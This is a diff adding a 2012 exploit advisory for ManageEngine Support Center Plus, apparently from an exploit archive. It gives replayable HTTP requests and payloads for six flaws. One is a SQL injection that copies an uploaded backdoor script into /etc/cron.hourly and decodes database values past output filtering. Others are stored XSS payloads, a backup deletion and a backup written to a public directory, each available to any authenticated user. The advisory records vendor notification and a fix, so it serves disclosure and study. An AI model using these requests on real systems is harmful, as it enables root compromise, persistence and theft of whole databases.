@@ -1,0 +1,170 @@
+  _______         _______  _______             __ 
+ |   _   |.--.--.|   _   ||   _   |    .-----.|  |
+ |.  |   ||_   _||   |   ||.  |   | __ |     ||  |
+ |.  |   ||__.__| \___   ||.  |   ||__||__|__||__|
+ |:  1   |       |:  1   ||:  1   |               
+ |::.. . |       |::.. . ||::.. . |               
+ `-------'       `-------'`-------'               
+                                                  
++--------------------------------------------------------------------------------------------------------------------------------+
+| Exploit Title     : ManageEngine Support Center Plus <=7903 Multiple Vulnerabilities
+| Date              : 15-04-2012
+| Author            : Robert 'xistence' van Hamburg (xistence<[AT]>0x90.nl
+| Software link SP  : http://www.manageengine.com/products/support-center/64045241/ManageEngine_SupportCenter_Plus_7_9_0_SP-0_3_0.ppm
+| Vendor site       : http://www.manageengine.com/products/support-center/
+| Version           : 7903 and lower
+| Tested on         : CentOS 5 Linux (Windows version also vulnerable, although untested)
+|
+| Vendor Notified	: 24-08-2011
+| Vendor Fixed		: 05-01-2012
+| Fixed version		: 7905 - latest = 7908
++--------------------------------------------------------------------------------------------------------------------------------+
+
+
++--------------------------------------------------------------------------------------------------------------------------------+
+| 0x01 - SQL Injection in Row Count
++--------------------------------------------------------------------------------------------------------------------------------+
+
+Normally when you click on the row count the following POST request is executed:
+
+POST /servlet/AJaxServlet?action=getWorkOrderCount HTTP/1.1
+Host: supportcenter:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:6.0.2) Gecko/20100101 Firefox/6.0.2
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.5.1.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://supportcenter:8080/WOListView.do?viewName=All_Requester
+Content-Length: 2062
+Cookie: JSESSIONID=8C712F3C4F909CB5ABE4B2E9E688C55D; 2RequestsshowThreadedReq=showThreadedReqshow;
+	2RequestshideThreadedReq=hideThreadedReqhide; JSESSIONIDSSO=5E58C910F58B97EF3776124641E4C4CC; PREV_CONTEXT_PATH=/custom
+Pragma: no-cache
+Cache-Control: no-cache
+
+countSql=select%20count(*)%20from%20workorder%20wo%20left%20join%20workorder_fields%20wof%20on%20wo.workorderid%3Dwof.workorderid%20left%20join%20workorder_product%20on%20wo.workorderid%3Dworkorder_product.workorderid%20left%20join%20componentdefinition%20on%20workorder_product.product_id%3Dcomponentdefinition.componentid%20inner%20join%20workorderstates%20wos%20on%20wo.workorderid%3Dwos.workorderid%20left%20join%20categorydefinition%20cd%20on%20wos.categoryid%3Dcd.categoryid%20left%20join%20subcategorydefinition%20scd%20on%20wos.subcategoryid%3Dscd.subcategoryid%20left%20join%20aaauser%20aau%20on%20wo.requesterid%3Daau.user_id%20left%20join%20aaauser%20ti%20on%20wos.ownerid%3Dti.user_id%20left%20join%20statusdefinition%20std%20on%20wos.statusid%3Dstd.statusid%20left%20join%20departmentdefinition%20dpt%20on%20wo.deptid%3Ddpt.deptid%20left%20join%20workorder_account%20woacc%20on%20wo.workorderid%3Dwoacc.workorderid%20left%20join%20aaausercontactinfo%20user_contact%20on%20aau.user_id%3Duser_contact.user_id%20left%20join%20aaacontactinfo%20rcontact%20on%20user_contact.contactinfo_id%3Drcontact.contactinfo_id%20left%20join%20leveldefinition%20lvd%20on%20wos.levelid%3Dlvd.levelid%20left%20join%20prioritydefinition%20pd%20on%20wos.priorityid%3Dpd.priorityid%20left%20join%20modedefinition%20mdd%20on%20wo.modeid%3Dmdd.modeid%20left%20join%20aaausercontactinfo%20auci1%20on%20aau.user_id%3Dauci1.user_id%20left%20join%20aaacontactinfo%20aci1%20on%20auci1.contactinfo_id%3Daci1.contactinfo_id%20left%20join%20workorder_queue%20wo_queue%20on%20wo.workorderid%3Dwo_queue.workorderid%20left%20join%20queuedefinition%20queue%20on%20wo_queue.queueid%3Dqueue.queueid%20left%20join%20sduser%20crd%20on%20wo.createdbyid%3Dcrd.userid%20left%20join%20aaauser%20cri%20on%20crd.userid%3Dcri.user_id%20left%20join%20aaaorganization%20org%20on%20woacc.accountid%3Dorg.org_id%20left%20join%20aaaorganization%20sorg%20on%20woacc.subaccountid%3Dsorg.org_id%20where%20%20((aau.user_id%20%3D%202)%20and%20((wo.isparent%20%3D%20'1')%20and%20(wo.departmentid%20%3D%201)))
+
+File access as root:
+As you see, you can put a normal MySQL query in the countSql parameter.
+However, I found out there is some input and output validation in place. It's not possible to use a "CREATE", or "INSERT" query. SELECT however is possible.
+This still makes it possible to use the following trick:
+
+Add an attachment to a (new) ticket, like a "backdoor.sh" and press attach. BUT DO NOT PRESS "DONE"! Keep the window open. The file will be in a temporary directory now. (/ManageEngine/SupportCenter/bin/Attachments/Request/<YOURUSERID>/)
+
+Now send a POST request with:
+
+countSql=select load_file("../../bin/Attachments/Request/<YOURUSERID>/backdoor.sh") into dumpfile "/etc/cron.hourly/backdoor.sh";
+
+Which creates the backdoor.sh file in /etc/cron.hourly.
+
+Above is a blind SQL injection, as you won't see the results in your browser.
+Extra note: "grant" is possible too, so you could add any user or change permissions.
+
+
+IDS/Output validation bypass:
+
+After some testing I found out it's only possible to get numeric responses back in the web browser. So you can't read usernames/md5 hashes directly from the database. However, it's still possible to bypass this "protection":
+
+We can send a query that retrieves the username of user_id =2 from the aaauser table, convert it to hex (base 16) and then convert it to base 10:
+countSql=select conv(hex(first_name),16,10) from aaauser where user_id = 2;
+
+This will give the following result:
+
+444351214452
+
+Now in any local MySQL instance you can convert that back to hex (base 16) and unhex it:
+
+mysql> select unhex(conv('444351214452', 10, 16));
++-------------------------------------+
+| unhex(conv('444351214452', 10, 16)) |
++-------------------------------------+
+| guest                               |
++-------------------------------------+
+
+
++--------------------------------------------------------------------------------------------------------------------------------+
+| 0x02 - Stored XSS vulnerability as anonymous user
++--------------------------------------------------------------------------------------------------------------------------------+
+
+XSS/Cross Site Scripting vulnerability as anonymous user:
+http://support:8080/sd/Request.sd
+Vulnerable input fields are: Name, Message
+Input: <script>alert('Hello World')</script>
+
+E-mail: my-email@test'<script>alert('Hello World')</script>
+
+
++--------------------------------------------------------------------------------------------------------------------------------+
+| 0x03 - Stored XSS vulnerabilities as ANY authenticated user - user details
++--------------------------------------------------------------------------------------------------------------------------------+
+
+Possible by browsing to this url and fill in the form fields
+http://support:8080/RequesterDef.do?mode=edit&id=2 (id of the current user)
+Vulnerable input fields are: Name, Twitter Screen Name, Job Title
+
+Input: <script>alert('Hello World')</script>
+
++--------------------------------------------------------------------------------------------------------------------------------+
+| 0x04 - Stored XSS vulnerabilities as ANY authenticated user - ticket
++--------------------------------------------------------------------------------------------------------------------------------+
+
+Create a new request through the website with the http://<SUPPORTCENTER>:8080/WorkOrder.do url as any user. Enter any subject and select Plain Text on the description. Enter <script>alert("Hello World")</script> in the description field. Press "Add Request".
+
+Now when you browse to the http://<SUPPORTCENTER>:8080/WOListView.do and click on the ticket you just created you'll receive a popup which says "Hello World", which makes it possible to put stored javascript/html code inside the description.
+
+POST a new request (below are the headers to exploit this)
+POST /WorkOrder.do HTTP/1.1
+Host: support:8080
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://support:8080/WorkOrder.do
+Cookie: JSESSIONID=75291FED727C1BCA5CD2F5A46AA97071; PREV_CONTEXT_PATH=; JSESSIONIDSSO=BA4D299A5FCBAB586F462AED5A730D67
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 322
+
+PARAMETERS: reqTemplate=&prodId=0&priority=2&reqID=2&usertypename=Requester&reqName=guest&category=1&item=0&subCategory=0&title=Test&description=%3Cbr+%2F%3E%3Cscript%3Ealert%28%27Hello+World%27%29%3C%2Fscript%3E&MOD_IND=WorkOrder&FORMNAME=WorkOrderForm&attach=&attPath=&component=Request&attSize=&attachments=&autoCCList=&addWO=addWO
+
+
++--------------------------------------------------------------------------------------------------------------------------------+
+| 0x05 - Delete Support Center Plus Backups as ANY authenticated user
++--------------------------------------------------------------------------------------------------------------------------------+
+
+Delete Support Center Plus Backups as ANY authenticated user
+Change the ids= to delete other backups
+http://support:8080?/BackupSchedule.do?module=delete_backup&backup_ids=<ID>
+
+
++--------------------------------------------------------------------------------------------------------------------------------+
+| 0x06 - Create a Backup schedule as ANY authenticated user and write the backup file to a public accessible  directory
++--------------------------------------------------------------------------------------------------------------------------------+
+
+Create a Backup schedule as ANY authenticated user and write backup file to a public access directory
+Below are the headers to create a backup schedule on 2011-08-24 13:10. After this has been done, it's possible to download
+the Support Center Plus backup file at http://support:8080/inlineimages/backup_supportcenter_7901_fullbackup_08_24_2011_13_10.data
+For this you only need to know the version of the support center and the date/time (which we set our selfs in the POST)
+
+POST /BackupSchedule.do HTTP/1.1
+Host: support:8080
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.5.1.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://support:8080/AdminHome.do
+Cookie: JSESSIONID=001CFC62780059CC1FC04ADA6CF7347D; PREV_CONTEXT_PATH=; fromPortal=customerportal; JSESSIONIDSSO=57D961350A26A1D9D8C70AFA6E10760E
+DNT: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+PARAMETERS module=save_schedule&days=1&backupStartDate=2011-08-24&hours=13&minutes=10&backupType=fullbackup&backupstatus=enabled&backupLocation=..%2Finlineimages%2F
